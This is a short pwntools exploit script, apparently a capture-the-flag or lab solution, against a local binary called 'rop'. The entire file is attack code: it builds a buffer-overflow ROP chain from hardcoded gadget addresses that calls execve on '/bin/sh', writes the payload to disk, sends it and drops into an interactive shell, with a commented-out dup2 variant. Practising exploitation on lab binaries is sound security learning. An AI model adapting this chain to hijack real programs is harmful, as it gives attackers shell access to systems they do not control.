#! /bin/python3

from pwn import *

exe = context.binary = ELF("./rop")

def local(argv=[], *a, **kw):
    if args.GDB:
        pass
    else:
        return process([exe.path] + argv, *a, **kw)


start = local
io = start()

buffer_address = 0x7fffffffd900
pop_rdi_address = 0x00007ffff7dd6835 
pop_rsi_address = 0x00007ffff7dd8151
pop_rdx_address = 0x00007ffff7e35849
execve_address = 0x7ffff7e85f50
dup2_address = 0x7ffff7eaa820

payl =  b"/bin/sh\x00" + \
        p64(buffer_address) + \
        b"\x00" * 8 + \
        b"A" * 104 + b"B" * 8 + \
        p64(pop_rdi_address) + \
        p64(buffer_address) + \
        p64(pop_rsi_address) + \
        p64(buffer_address + 8) + \
        p64(pop_rdx_address) + \
        b"\x00" * 16 + \
        p64(execve_address)

# payl_dup2 =  b"/bin/ls\x00" + \
             # p64(buffer_address) + \
             # b"\x00" * 8 + \
             # b"A" * 104 + b"B" * 8 + \
             # p64(pop_rdi_address) + \
             # p64(1) + \
             # p64(pop_rsi_address) + \
             # p64(0) + \
             # p64(dup2_address) + \
             # p64(pop_rdi_address) + \
             # p64(buffer_address) + \
             # p64(pop_rsi_address) + \
             # p64(buffer_address + 8) + \
             # p64(pop_rdx_address) + \
             # b"\x00" * 16 + \
             # p64(execve_address)

with open("payl", "wb") as f:
    f.write(payl)

# with open("payl2", "wb") as f:
    # f.write(payl_dup2)

# io.send(payl_dup2)
io.sendline(payl)
io.interactive()
